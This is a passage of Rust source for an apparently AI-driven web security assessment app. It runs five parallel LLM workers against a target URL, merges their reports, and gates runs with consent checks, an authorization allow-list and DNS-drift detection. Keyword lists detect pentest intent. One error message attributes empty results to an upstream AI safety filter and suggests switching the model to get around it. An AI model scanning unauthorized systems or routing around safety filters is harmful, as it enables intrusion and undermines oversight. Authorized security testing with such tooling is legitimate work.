                pump_and_wait(app, id, proc_key, pipes, None, prep.tool_prefix, prep.enforce_auth, Some(report_tag))
            }
            Err(e) => {
                emit_note(app, id, format!("[오류] {label} 실행 실패: {e}"), None);
                PumpOutcome { text: String::new(), failed: true, aborted: false, settled: false, blocked: false, error: e }
            }
        },
        Err(e) => {
            emit_note(app, id, format!("[오류] {label} 준비 실패: {e}"), None);
            PumpOutcome { text: String::new(), failed: true, aborted: false, settled: false, blocked: false, error: e }
        }
    }
}

/// 정밀 진단 — 다섯 가지를 독립 pi 세션으로 동시에 실행한 뒤 하나로 병합.
/// prime-agent builder(factory) 패턴의 RedCell 구현: 병렬 섹션 작성자 + fan-in 병합.
/// 1차 확인 직후 1차 리포트를 먼저 발행하고 추가 확인은 뒤에서 계속한다 —
/// 사용자는 언제든 중지해 1차 리포트만 받을 수 있다.
/// 즉시 반환하며, 진행은 `engagement-event`(worker_status·노트)/`engagement-status` 로 전달된다.
#[tauri::command]
fn start_deep_diagnosis(app: AppHandle, id: String) -> Result<(), String> {
    let (s, settings, redcell, provider) = engagement_precheck(&app, &id)?;
    if s.host.trim().is_empty() {
        return Err("진단은 주소가 필요합니다 — 위에 URL 을 입력하세요.".into());
    }
    gate_session_instruction(&app, &id, &s)?;
    // 심층 플래그 확정 (결과 탭이 진단 리포트로 렌더되도록 diag 도 함께).
    {
        let guard = app.state::<IoGuard>();
        let _lock = guard.0.lock().unwrap();
        let p = session_file(&app, &id);
        if let Some(mut cur) = fs::read_to_string(&p)
            .ok()
            .and_then(|t| serde_json::from_str::<Session>(&t).ok())
        {
            cur.deep = true;
            cur.diag = true;
            cur.updated_at = now();
            if let Ok(txt) = serde_json::to_string_pretty(&cur) {
                fs::write(p, txt).ok();
            }
        }
    }
    let s = ensure_piq(&app, &s);
    let piq = s.piq.clone();
    let target = target_url(&s.host, s.port);
    let mut https_hint = https_hint_for(&s.host, s.port);
    // 로그인 쿠키 맥락을 워커에 고지 — W3(로그인 점검)는 P0 인증 증거를 우선 인용한다.
    if !s.auth_cookie.trim().is_empty() {
        if !https_hint.is_empty() {
            https_hint.push(' ');
        }
        https_hint.push_str("로그인 쿠키 적용됨 — P0가 인증 영역까지 스윕했으니 인증 관련 증거([P-###] auth-*/jwt-*/세션)를 우선 인용하고, 비로그인 가정 시나리오는 쓰지 마라.");
    }
    let goal = if s.goal.trim().is_empty() {
        "이 서비스의 보안 진단 리포트를 작성해줘.".to_string()
    } else {
        s.goal.trim().to_string()
    };
    let mem = memory_block(&app, &s.host);
    let engine = session_engine(&s);
    // 동기 프리플라이트 — 엔진 바이너리 미설치면 즉시 Err.
    if engine == Engine::Prime {
        prime_agent_path()?;
        warn_stale_prime(&app, &id);
    } else {
        prime_cli_path(&redcell)?;
        ensure_pinned_pi(&app, &id, &settings);
    }
    // LLM 사전 점검 — 프로바이더가 죽어 있으면 워커 5개가 전부 실패하기 전에
    // 여기서 원인(400/401/타임아웃)을 한 번에 보여주고 즉시 중단한다.
    preflight_llm_check(&app, &id, engine, &settings, &provider, &redcell, &piq)?;
    {
        let ev = json!({ "type": "note", "text": format!("[sys] 모델 연결 확인 완료({provider}) — 진단을 시작합니다.") });
        let stamped = append_event(&app, &id, &ev);
        app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
    }
    // 방어 상태 노트 — 워커마다 반복되지 않게 실행당 1회만.
    {
        let auth = auth::load(&resolve_app_auth_path(&app));
        if auth.yaml {
            let ev = json!({ "type": "note", "text": "[sys] 참고: 고급 설정(YAML) 사용 중 — 실행 중 감시는 동작하지 않고, 시작 전 주소 제한으로만 보호됩니다." });
            let stamped = append_event(&app, &id, &ev);
            app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
        }
        let nf = netfilter_extra_env(&app, &id, &auth, &provider, &settings);
        emit_netfilter_note(&app, &id, !nf.is_empty());
    }
    // DNS 드리프트(TOCTOU) 실행 시점 확인 — 경고 또는 핀 강제 중단.
    dns_drift_check(&app, &id, &s.host)?;

    set_status(&app, &id, "running");
    app.emit("engagement-status", json!({ "sessionId": id, "status": "running" })).ok();
    {
        let ev = json!({ "type": "note", "text": "[sys] 진단 시작 — 기본 점검 후 다섯 가지(구조·입력값·로그인·정보 노출·기능 오용)를 동시에 살펴봅니다.".to_string() });
        let stamped = append_event(&app, &id, &ev);
        app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
    }

    let deep_start = std::time::SystemTime::now();
    thread::spawn(move || {
        // 기본 점검: 결정적 대량 확인을 먼저 실행하고 증거를 다섯 분야·병합에게 나눠준다.
        let sweep = run_p0_sweep(&app, &id, &s.host, s.port, &s.auth_cookie, s.danger_consent);
        // 기본 점검 도중 중지됐으면 다섯 분야를 띄우지 않고 마감한다 (stop_engagement 가 이미 stopped 처리).
        if read_session(&app, &id).map(|s| s.status == "stopped").unwrap_or(true) {
            return;
        }
        let digest_w = p0_evidence_block(&sweep, 6000);
        let digest_c = p0_evidence_block(&sweep, 12000);
        let playbook = session_playbook_block(&sweep);
        // 워커 실행 클로저 — round 0 = 1차, 1+ = 추가 확인 (동일 세션 연속).
        let run_round = |round: u32, ctx: &std::collections::HashMap<String, (String, String)>| -> Vec<(String, PumpOutcome)> {
            for def in DEEP_WORKERS {
                let ev = json!({ "type": "worker_status", "worker": def.id, "title": def.title, "label": def.label, "state": "running" });
                let stamped = append_event(&app, &id, &ev);
                app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
            }
            let mut handles = Vec::new();
            for def in DEEP_WORKERS {
                let app = app.clone();
                let id = id.clone();
                let settings = settings.clone();
                let redcell = redcell.clone();
                let provider = provider.clone();
                let piq = piq.clone();
                let target = target.clone();
                let goal = goal.clone();
                let https_hint = https_hint.clone();
                let mem = mem.clone();
                let digest_w = digest_w.clone();
                let playbook = playbook.clone();
                let (own_prior, cross) = ctx.get(def.id).cloned().unwrap_or_default();
                handles.push(thread::spawn(move || -> (String, PumpOutcome) {
                    let tag = WorkerTag { id: def.id.to_string(), label: def.label.to_string() };
                    // 구조화 발견 파일 절대경로 — 워커가 JSON 을 저장하고 collector 가 읽는다.
                    let findings_path = if engine == Engine::Prime {
                        prime_session_dir(&app, &id, def.id).join("work").join(findings_filename(def.id)).to_string_lossy().into_owned()
                    } else {
                        sessions_dir(&app).join(findings_filename(&format!("{piq}-{}", def.id))).to_string_lossy().into_owned()
                    };
                    let mut instruction = if round == 0 {
                        let mut i = deep_worker_instruction(def, &target, &goal, &https_hint, &mem, &findings_path);
                        i.push_str(&digest_w);
                        i
                    } else {
                        let mut i = deep_followup_instruction(def, round + 1, &own_prior, &cross, &target, &findings_path);
                        i.push_str(&playbook);
                        i
                    };
                    if engine == Engine::Prime {
                        instruction = prime_adapt_deep(instruction);
                    }
                    // 라운드가 바뀌어도 세션은 유지 (pi session-id / prime session-dir 연속).
                    let run_tag = if engine == Engine::Prime { def.id.to_string() } else { format!("{piq}-{}", def.id) };
                    let key = format!("{id}#{}", def.id);
                    // prime 스폰 시차 — 커널 셋업 경합 완화 (pi는 불필요).
                    if engine == Engine::Prime {
                        let wait = prime_spawn_stagger_ms().saturating_mul(worker_spawn_index(def.id));
                        if wait > 0 {
                            thread::sleep(std::time::Duration::from_millis(wait.min(15_000)));
                        }
                    }
                    let outcome = match prepare_engine_run(&app, &id, engine, &settings, &provider, &redcell, &run_tag, instruction, true) {
                        Ok(prep) => match spawn_prepared(&prep, &provider, &settings) {
                            Ok((child, pipes)) => {
                                app.state::<Procs>().0.lock().unwrap().insert(key.clone(), child);
                                pump_and_wait(&app, &id, &key, pipes, Some(tag.clone()), prep.tool_prefix, prep.enforce_auth, None)
                            }
                            Err(e) => {
                                emit_note(&app, &id, format!("[오류] {e}"), Some(&tag));
                                PumpOutcome { text: String::new(), failed: true, aborted: false, settled: false, blocked: false, error: e }
                            }
                        },
                        Err(e) => {
                            emit_note(&app, &id, format!("[오류] {e}"), Some(&tag));
                            PumpOutcome { text: String::new(), failed: true, aborted: false, settled: false, blocked: false, error: e }
                        },
                    };
                    let state = if outcome.aborted { "stopped" } else if outcome.failed && !has_usable_text(&outcome) { "error" } else { "done" };
                    let ev = json!({ "type": "worker_status", "worker": def.id, "title": def.title, "label": def.label, "state": state });
                    let stamped = append_event(&app, &id, &ev);
                    app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
                    (def.id.to_string(), outcome)
                }));
            }
            let mut out: Vec<(String, PumpOutcome)> = handles
                .into_iter()
                .map(|h| {
                    h.join().unwrap_or_else(|_| {
                        ("w?".into(), PumpOutcome { text: String::new(), failed: true, aborted: false, settled: false, blocked: false, error: "워커 스레드 패닉".into() })
                    })
                })
                .collect();
            out.sort_by(|a, b| a.0.cmp(&b.0));
            out
        };
        let is_stopped = |results: &[(String, PumpOutcome)]| -> bool {
            read_session(&app, &id).map(|s| s.status == "stopped").unwrap_or(false)
                || results.iter().any(|(_, o)| o.aborted)
        };
        // agentic loop — 1차 → (새로 찾은 게 있으면) 추가 확인, 없으면 바로 최종 리포트로.
        let mut accum: std::collections::HashMap<String, String> = std::collections::HashMap::new();
        let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
        let mut results = run_round(0, &std::collections::HashMap::new());
        for (wid, o) in &results {
            if !o.failed || has_usable_text(o) {
                accum.insert(wid.clone(), o.text.clone());
                for k in extract_finding_keys(&o.text) {
                    seen.insert(k);
                }
            }
        }
        // 1차 전체 실패 = AI 모델 연결 문제 — 추가 확인·최종 병합은 시도할 가치가
        // 없다. 원인을 그대로 보여주고 즉시 마감한다.
        if !results.is_empty() && results.iter().all(|(_, o)| o.failed && !has_usable_text(o)) {
            let detail = results
                .iter()
                .find_map(|(_, o)| if o.error.is_empty() { None } else { Some(o.error.clone()) })
                .unwrap_or_default();
            let why = classify_ping_failure(&settings, &provider, &detail);
            let ev = json!({ "type": "note", "text": format!(
                "[오류] 다섯 곳 모두 AI 호출에 실패해 진단을 중단합니다.\n{why}"
            )});
            let stamped = append_event(&app, &id, &ev);
            app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
            if read_session(&app, &id).map(|s| s.status == "running").unwrap_or(false) {
                set_status(&app, &id, "error");
                app.emit("engagement-status", json!({ "sessionId": id, "status": "error" })).ok();
            }
            return;
        }
        // 1차 리포트 — 1차 확인 결과로 먼저 발행하고, 추가 확인은
        // 뒤에서 계속한다. 사용자는 언제든 중지해 1차 리포트만 받을 수 있다.
        let mut early_published = false;
        let mut early_text = String::new();
        {
            let (combined_early, ok_early) = combine_worker_outputs(&accum, 1);
            if ok_early > 0 && !is_stopped(&results) {
                emit_note(&app, &id, format!("[sys] 1차 확인 끝(다섯 곳 중 {ok_early}곳 응답) — 1차 리포트를 만듭니다…"), None);
                let mut merge = early_merge_instruction(deep_merge_instruction(&target, &goal, &combined_early, &mem, "1차 리포트"));
                if engine == Engine::Prime {
                    merge = prime_adapt_deep(merge);
                }
                merge.push_str(&digest_c);
                merge.push_str(&playbook);
                let run_tag = if engine == Engine::Prime { "merge-early".to_string() } else { format!("{piq}-merge-early") };
                let key = format!("{id}#merge-early");
                let outcome = run_collector_merge(&app, &id, engine, &settings, &provider, &redcell, &run_tag, merge, &key, "early", "1차 리포트", &piq);
                if ((!outcome.failed && !outcome.aborted) || has_usable_text(&outcome)) && !outcome.text.trim().is_empty() {
                    early_published = true;
                    early_text = outcome.text.trim().to_string();
                    // 발행 파일 자동 저장 — 실패하면 한 줄로 알린다(열 때 저장됨).
                    if let Err(e) = write_report_file(&reports_dir(&app), &id, "early", outcome.text.trim()) {
                        emit_note(&app, &id, format!("[sys] 1차 리포트 자동 저장 실패({e}) — 결과 탭에서 MD로 저장하세요."), None);
                    }
                    emit_note(&app, &id, "[완료] 1차 리포트 완성 — 결과 리포트 탭에서 확인하세요. 추가 확인은 뒤에서 계속됩니다.".to_string(), None);
                } else if outcome.aborted || read_session(&app, &id).map(|s| s.status == "stopped").unwrap_or(false) {
                    return; // 1차 병합 중 중지 — 리포트 없이 stopped 유지
                } else {
                    emit_note(&app, &id, "[sys] 1차 리포트를 만들지 못했습니다 — 추가 확인 뒤 최종 리포트로 시도합니다.".to_string(), None);
                }
            }
        }
        let mut rounds_run: u32 = 1;
        for round in 1..DEEP_MAX_ROUNDS {
            if is_stopped(&results) {
                break;
            }
            // 추가 확인 컨텍스트 — 자가 누적 + 타 분야 단서 + 밴딧 집중 지시.
            let yields = bandit_yields(&results, &seen);
            let focus = bandit_focus_lines(&yields);
            let (ctx, leads) = build_followup_context(&results, &accum, &focus);
            let top = yields.first().filter(|(_, n)| *n > 0).map(|(w, n)| format!(" — 수확 1위 {w}({n}건)")).unwrap_or_default();
            {
                let ev = json!({ "type": "note", "text": format!("[sys] 추가 확인 {}차 시작 — 엇갈린 단서 {leads}건 확인{top}.", round + 1) });
                let stamped = append_event(&app, &id, &ev);
                app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
            }
            results = run_round(round, &ctx);
            rounds_run += 1;
            let mut new_n = 0usize;
            for (wid, o) in &results {
                if o.failed && !has_usable_text(o) {
                    continue;
                }
                for k in extract_finding_keys(&o.text) {
                    if seen.insert(k) {
                        new_n += 1;
                    }
                }
                accum.entry(wid.clone()).or_default().push_str(&format!("\n\n--- 추가 확인 {}차 ---\n{}", round + 1, o.text));
            }
            {
                let ev = json!({ "type": "note", "text": format!("[sys] 추가 확인 {}차 끝 — 새로 찾은 것 {new_n}건.", round + 1) });
                let stamped = append_event(&app, &id, &ev);
                app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
            }
            if new_n == 0 {
                let ev = json!({ "type": "note", "text": "[sys] 새로 찾은 것이 없어 추가 확인을 마칩니다 — 최종 리포트를 만듭니다." });
                let stamped = append_event(&app, &id, &ev);
                app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
                break;
            }
        }

        // 중단됐으면 최종 병합 없이 마감. 1차 리포트가 있으면 유지하고 done 으로
        // 마감해 사용자가 "리포트만 받고 취소" 할 수 있게 한다.
        if is_stopped(&results) {
            if early_published {
                emit_note(&app, &id, "[완료] 추가 확인을 중단했습니다 — 1차 리포트는 그대로 둡니다.".to_string(), None);
                set_status(&app, &id, "done");
                app.emit("engagement-status", json!({ "sessionId": id, "status": "done" })).ok();
            }
            return;
        }
        // 최종 병합 — 다섯 가지 발견(전 차수 누적)을 결과 리포트로 정리.
        let (combined, ok_n) = combine_worker_outputs(&accum, rounds_run);
        {
            let ev = json!({ "type": "note", "text": "[sys] 다섯 가지 확인 끝 — 최종 리포트를 만듭니다.".to_string() });
            let stamped = append_event(&app, &id, &ev);
            app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
        }
        // 전 워커 빈 응답 — 병합할 게 없으니 collector 를 돌리지 않고 원인을 안내한다
        // (핑은 통과했지만 진단 본문이 필터된 경우의 방어선).
        if ok_n == 0 {
            let ev = json!({ "type": "note", "text": format!(
                "[오류] 다섯 곳 모두 빈 응답이라 리포트를 만들 수 없습니다.\n원인 후보: AI의 상류 안전 필터(진단 용어·툴 정의 차단).\nlge-aigw 모델이 Sonnet 서빙이면 `{}` 로 되돌리고 다시 실행하세요.",
                LGE_AIGW_DEFAULT_MODEL
            )});
            let stamped = append_event(&app, &id, &ev);
            app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
            if read_session(&app, &id).map(|s| s.status == "running").unwrap_or(false) {
                set_status(&app, &id, "error");
                app.emit("engagement-status", json!({ "sessionId": id, "status": "error" })).ok();
            }
            return;
        }
        // 기계 대조 — 1차 리포트(없으면 워커 누적) 주장을 하네스가 재요청 검증하고
        // 최종 병합에 반영한다. [실증] 자기채점의 기계망 + 환각 P-ID 검출.
        let verify_src = if !early_text.trim().is_empty() { early_text.clone() } else { combined.clone() };
        let mut verify_block = String::new();
        if !verify_src.trim().is_empty() {
            emit_note(&app, &id, "[sys] 기계 대조 — 증거 발췌 재확인 중…".to_string(), None);
            // 검증 대상 ID 맵 — P-ID → 엔진 심각도(스윕 결과에서 만든다).
            // 이 맵이 유효 P-ID 집합이자 위험도 대조의 근거가 된다.
            let evidence: HashMap<String, String> =
                sweep.hits.iter().map(|h| (h.id.clone(), h.severity.clone())).collect();
            let vauth = auth::load(&resolve_app_auth_path(&app));
            let rep = verify_report_claims(&verify_src, &evidence, &vauth, &s.auth_cookie);
            emit_note(&app, &id, verify_note_line(&rep), None);
            verify_block = verify_report_block(&rep);
        }
        let mut merge = deep_merge_instruction(&target, &goal, &combined, &mem, "최종 리포트");
        if engine == Engine::Prime {
            merge = prime_adapt_deep(merge);
        }
        merge.push_str(&digest_c);
        merge.push_str(&verify_block);
        merge.push_str(&playbook);
        let run_tag = if engine == Engine::Prime { "merge".to_string() } else { format!("{piq}-merge") };
        let merge_outcome = run_collector_merge(&app, &id, engine, &settings, &provider, &redcell, &run_tag, merge, &id, "final", "최종 리포트", &piq);
        let ok = (!merge_outcome.failed && !merge_outcome.aborted) || has_usable_text(&merge_outcome);
        if ok && !merge_outcome.text.trim().is_empty() {
            // 발행 파일 자동 저장 — 실패하면 한 줄로 알린다(열 때 저장됨).
            if let Err(e) = write_report_file(&reports_dir(&app), &id, "final", merge_outcome.text.trim()) {
                emit_note(&app, &id, format!("[sys] 최종 리포트 자동 저장 실패({e}) — 결과 탭에서 MD로 저장하세요."), None);
            }
        }
        {
            let final_failed_with_early = !ok && !merge_outcome.aborted && early_published;
            let ev = json!({ "type": "note", "text": if ok {
                if merge_outcome.failed {
                    "[완료] 최종 리포트 완성 — 결과 리포트 탭에서 확인하세요. (응답 끝부분이 잘렸을 수 있습니다)".to_string()
                } else {
                    "[완료] 최종 리포트 완성 — 결과 리포트 탭에서 확인하세요.".to_string()
                }
            } else if merge_outcome.aborted {
                "[중지] 최종 리포트 만들기를 중단했습니다.".to_string()
            } else if final_failed_with_early {
                "[완료] 최종 리포트를 만들지 못했습니다 — 1차 리포트는 결과 탭에 그대로 있습니다. 찾은 내용은 진행 상황에서도 볼 수 있습니다.".to_string()
            } else {
                "[완료] 최종 리포트를 만들지 못했습니다 — 찾은 내용은 진행 상황에서 볼 수 있습니다.".to_string()
            }});
            let stamped = append_event(&app, &id, &ev);
            app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
        }
        // harness 메모리(prime-agent 패턴): 진단 이력 1줄을 대상별로 누적.
        // 최종 병합이 실패해도 1차 리포트가 있으면 사용자에게 남는 것은 성공이다.
        let delivered = ok || early_published;
        record_history(&app, &s.host, ok_n, DEEP_WORKERS.len(), delivered);
        // prime 전담 HOME 사후 감사 — 워커·병합 전체 태그를 1회 훑는다.
        if engine == Engine::Prime {
            audit_prime_homes(&app, &id);
        }
        audit_temp_window(&app, &id, deep_start);
        if let Some(cur) = read_session(&app, &id) {
            if cur.status == "running" {
                let st = if delivered { "done" } else { "error" };
                set_status(&app, &id, st);
                app.emit("engagement-status", json!({ "sessionId": id, "status": st })).ok();
            } else if cur.status == "stopped" && early_published {
                // 최종 병합 중 취소 — 1차 리포트를 유지하고 done 으로 마감한다.
                emit_note(&app, &id, "[완료] 추가 확인을 중단했습니다 — 1차 리포트는 그대로 둡니다.".to_string(), None);
                set_status(&app, &id, "done");
                app.emit("engagement-status", json!({ "sessionId": id, "status": "done" })).ok();
            }
        }
    });
    Ok(())
}

#[tauri::command]
/// 위험 지시문 게이트 — 실행 진입점 공용. 미동의 위험 지시는
/// CONSENT_REQUIRED 에러로 막고, Caution 은 주의 노트만 남기고 진행한다.
fn gate_session_instruction(app: &AppHandle, id: &str, s: &Session) -> Result<(), String> {
    match risk::gate_instruction(&s.goal, s.danger_consent) {
        Ok(rep) => {
            if rep.level == risk::RiskLevel::Caution {
                let titles: Vec<String> = rep.concerns.iter().map(|c| c.title.clone()).collect();
                let ev = json!({ "type": "note", "text": format!("[sys] 주의: {} — {}", titles.join("·"), rep.summary) });
                let stamped = append_event(app, id, &ev);
                app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
            }
            Ok(())
        }
        Err(e) => Err(e),
    }
}

/// DNS 드리프트(TOCTOU) 실행 시점 확인 — 인가 시점과 다른 IP 로 바뀌었으면 경고.
/// REDCELL_DNS_PIN=1 이면 경고 대신 실행을 중단한다 (CDN·LB 환경은 오탐 가능 — 기본 경고만).
fn dns_drift_check(app: &AppHandle, id: &str, host: &str) -> Result<(), String> {
    let auth = auth::load(&resolve_app_auth_path(app));
    if auth.yaml {
        return Ok(());
    }
    let drifted = auth::dns_drifted(host, &auth.allows, &auth::resolve_ips(host));
    if drifted.is_empty() {
        return Ok(());
    }
    let msg = format!(
        "DNS 변경 감지 — {host} 가 인가 목록에 없던 IP({})로 해석됩니다 (리바인딩 의심).",
        drifted.join(",")
    );
    if std::env::var("REDCELL_DNS_PIN").map(|v| v.trim() == "1").unwrap_or(false) {
        return Err(format!("{msg}\n인가 대상을 다시 확인하고 실행하세요 (또는 REDCELL_DNS_PIN 을 해제)."));
    }
    emit_note(app, id, format!("[경고] {msg} 계속 진행합니다."), None);
    Ok(())
}

// ── 진단 의도 판별 — 채팅 지시문만 읽어 "보안 진단" 의도를 알아낸다 ──────────────
// 이 앱의 사용자는 "보인을 모르는 사람"이다. 대부분 채팅창에 "이 사이트 보안
// 진단해줘" 처럼 자연어로 지시한다. 그래서 채팅 경로가 심층 경로(REPORT_SPEC +
// P0 증거 + 결과 탭 리포트)와 같은 표준을 받도록, 지시문에서 진단 의도를
// 판별해 세션을 diag 로 승격시킨다.
//
// 판정은 백엔드에서만 한다(UI·외부 호출자 공통) — 같은 기준이 어긋나면
// "왜 진단으로 바뀌었나요" 를 설명할 수 없게 된다.

/// 강한 진단 신호 — 이것만 있으면 진단 의도로 확정한다.
const DIAG_STRONG: &[&str] = &[
    // 한국어
    "진단",
    "취약점",
    "취약",
    "해킹",
    "레드팀",
    "레드 팀",
    "모의해킹",
    "모의 해킹",
    "침투",
    "공격 벡터",
    "공격면",
    // 영어
    "diagnose",
    "diagnosis",
    "pentest",
    "pen test",
    "penetration test",
    "vulnerability",
    "vulnerabilities",
    "vuln scan",
    "vulnerability scan",
    "exploit",
    "owasp",
    "cwe",
    "cve",
    "red team",
    "redteam",
    "security assessment",
    "security audit",
    "security review",
    "security test",
    "security analysis",
    "bug bounty",
    "threat model",
    "attack surface",
];

/// 약한 진단 신호 — 일반 작업 지시와 함께 나오면 일반 작업으로 본다.
const DIAG_WEAK: &[&str] = &["점검", "보안", "audit"];

/// 일반 작업 지시 — "파일로 뽑아줘" 류는 진단이 아니다(강한 신호가 있을 때만 예외).
const GENERAL_TASK: &[&str] = &[
    "파일로 뽑",
    "뽑아줘",
    "뽑아",
    "목록 정리",
    "목록으로",
    "목록만",
    "다운로드",
    "요약",
    "추출해",
    "내보내",
    "정리해서",
    "정리해줘",
    "저장해",
];

/// 심층(깊게) 의도 신호 — 깊게/철저히 요청했으면 심층으로 간다.
/// (일반 작업 지시와 겹칠 때만 진단 신호를 함께 요구한다 — looks_like_deep_diagnosis)
const DEEP_KW: &[&str] = &[
    "깊게",
    "깊이",
    "정밀",
    "전면",
    "철저",
    "모든 관점",
    "전반적",
    "빠짐없이",
    "deep",
    "deeply",
    "in-depth",
    "thorough",
    "thoroughly",
    "comprehensive",
    "exhaustive",
    // "full" 은 단독으로는 일반 단어다("full text 검색") — 진단 명사와 붙을 때만 신호로 본다.
    "full assessment",
    "full review",
    "full audit",
    "full test",
    "full scan",
    "full report",
    "full analysis",
    "full security",
    "full pentest",
    "full penetration",
];

/// 부정형 — 키워드 뒤(한국어 어순)·앞(영어 어순)에 붙는 "그만" 류 표현.
/// risk.rs 의 negated() 와 같은 아이디어지만(private fn 이라) 독립 구현한다.
const NEG_BEFORE: &[&str] = &[
    "하지 마",
    "하지마",
    "하지 말",
    "그만",
    "안 해",
    "안해",
    "않아",
    "말아",
    "don't",
    "dont",
    "do not",
    "never",
    "no need",
    "without",
    "no ",
];
const NEG_AFTER: &[&str] = &[
    "하지",
    "하지 마",
    "하지마",
    "하지 말",
    "그만",
    "안 해",
    "안해",
    "않아",
    "말아",
];

/// 키워드 앞 최대 N 글자 — 부정 표현 탐색 창.
const NEG_BEFORE_CHARS: usize = 8;
/// 키워드 뒤 최대 N 글자 — 부정 표현 탐색 창(한국어는 뒤에 붙는다).
const NEG_AFTER_CHARS: usize = 12;

/// 키워드 앞 N 글자 — 문자 경계를 보존하며 잘라낸다.
fn window_before(text: &str, start: usize, n_chars: usize) -> &str {
    let mut bs = start;
    let mut count = 0usize;
    for (i, _) in text[..start].char_indices().rev() {
        if count >= n_chars {
            break;
        }
        bs = i;
        count += 1;
    }
    &text[bs..start]
}

/// 키워드 뒤 N 글자 — 문자 경계를 보존하며 잘라낸다.
fn window_after(text: &str, end: usize, n_chars: usize) -> &str {
    let mut count = 0usize;
    let mut e = end;
    for (i, c) in text[end..].char_indices() {
        if count >= n_chars {
            break;
        }
        e = end + i + c.len_utf8();
        count += 1;
    }
    &text[end..e]
}

/// 영문 키워드의 단어 경계 — 앞뒤가 영문/숫자면 다른 단어의 일부로 본다.
fn word_boundary_ok(text: &str, s: usize, e: usize) -> bool {
    let before_ok = match text[..s].chars().next_back() {
        None => true,
        Some(c) => !c.is_ascii_alphanumeric(),
    };
    let after_ok = match text[e..].chars().next() {
        None => true,
        Some(c) => !c.is_ascii_alphanumeric(),
    };
    before_ok && after_ok
}

/// 키워드 출현이 부정형인지 — 앞뒤 창에 부정 표현이 있으면 제외한다.
fn kw_negated(text: &str, s: usize, e: usize) -> bool {
    let before = window_before(text, s, NEG_BEFORE_CHARS);
    if NEG_BEFORE.iter().any(|m| before.contains(m)) {
        return true;
    }
    let after = window_after(text, e, NEG_AFTER_CHARS);
    NEG_AFTER.iter().any(|m| after.contains(m))
}

/// 키워드 목록 중 부정형이 아닌 출현이 하나라도 있는가.
/// (영문 키워드는 단어 경계를 적용하고, 한국어 키워드는 경계 검사를 하지 않는다)
fn has_kw(text: &str, kws: &[&str]) -> bool {
    kws.iter().any(|kw| {
        let k = kw.to_lowercase();
        if k.is_empty() {
            return false;
        }
        // 영문(숫자·공백·하이픈만) 키워드에만 단어 경계를 적용한다.
        let ascii = k.chars().all(|c| c.is_ascii_alphanumeric() || c == ' ' || c == '-');
        text.match_indices(k.as_str()).any(|(s, m)| {
            let e = s + m.len();
            if ascii && !word_boundary_ok(text, s, e) {
                return false;
            }
            !kw_negated(text, s, e)
        })
    })
}

/// 채팅 지시문이 보안 진단 의도인지 — 순수 함수(부작용 없음).
/// 강한 신호(진단·취약점·해킹·pentest·vulnerability …)가 있으면 진단이다.
/// 약한 신호(점검·보안·audit)만 있으면 일반 작업 지시와 겹치지 않을 때만 진단이다.
fn looks_like_diagnosis(goal: &str) -> bool {
    let g = goal.to_lowercase();
    if g.trim().is_empty() {
        return false;
    }
    let strong = has_kw(&g, DIAG_STRONG);
    let weak = has_kw(&g, DIAG_WEAK);
    if !strong && !weak {
        return false;
    }
    // 일반 작업 지시("파일로 뽑아줘"·"목록 정리해줘"·"다운로드"·"요약해줘")는 진단이 아니다.
    // 강한 진단 신호가 함께 있을 때만 예외(예: "취약점 목록 뽑아줘").
    if !strong && has_kw(&g, GENERAL_TASK) {
        return false;
    }
    true
}

/// 채팅 지시문이 심층(병렬 5분야 + 병합) 진단 의도인지 — 순수 함수.
/// 깊이 신호("깊게"·"정밀"·"전면"·"thorough" …)가 있으면 심층이다.
/// 단 "깊게 정리해줘" 처럼 일반 작업 지시면 깊이 신호만으로 승격하지 않는다.
fn looks_like_deep_diagnosis(goal: &str) -> bool {
    let g = goal.to_lowercase();
    if !has_kw(&g, DEEP_KW) {
        return false;
    }
    // 일반 작업 지시("깊게 정리해줘"·"요약해줘" 류)는 심층 진단이 아니다 —
    // 진단 신호가 함께 있을 때만 예외.
    if has_kw(&g, GENERAL_TASK) && !looks_like_diagnosis(goal) {
        return false;
    }
    true
}

#[tauri::command]
fn start_engagement(app: AppHandle, id: String) -> Result<(), String> {
    let (mut s, settings, redcell, provider) = engagement_precheck(&app, &id)?;
    // 진단 의도 판별 — 채팅으로 들어온 지시도 심층 경로와 같은 표준을 받게 한다.
    let diag_intent = looks_like_diagnosis(&s.goal);
    let deep_intent = looks_like_deep_diagnosis(&s.goal);
    let promote = !s.diag && (diag_intent || deep_intent); // 진단 승격 여부(영속 저장 대상)
    if promote {
        // 진단 승격 — 세션에 영속 저장한다(같은 세션의 다음 턴도 표준 진단을 유지).
        if let Some(mut cur) = read_session(&app, &id) {
            cur.diag = true;
            cur.updated_at = now();
            write_session_locked(&app, &cur);
        }
        s.diag = true;
    }
    if deep_intent && !s.host.trim().is_empty() {
        // 심층 라우팅 — start_deep_diagnosis 가 precheck·게이트·DNS 드리프트·LLM
        // 프리플라이트를 모두 자체 수행한다. 여기서 dns_drift_check·gate_session_instruction 을
        // 다시 부르면 같은 게이트/인가 검사가 두 번 돌아 노트·경고가 중복된다.
        // 따라서 deep 분기에서는 그 둘을 넘기고 start_deep_diagnosis 에 맡긴다.
        // (중복되는 것은 engagement_precheck 뿐인데, 이는 읽기 전용이라 무해하다.)
        emit_note(
            &app,
            &id,
            "[sys] '깊게/정밀' 요청으로 판단해 심층 진단(다섯 가지 관점 병렬 + 최종 병합)으로 진행합니다.".to_string(),
            None,
        );
        return start_deep_diagnosis(app, id);
    }
    if promote {
        // 왜 표준 진단으로 바뀌는지 — 비전문가도 알 수 있게 이유를 남긴다.
        let text = if deep_intent {
            // 심층 진단은 대상 주소가 있어야 한다(심층 경로 요구사항) — 주소가 없으면
            // 표준 진단으로 진행하고 그 사실을 알린다.
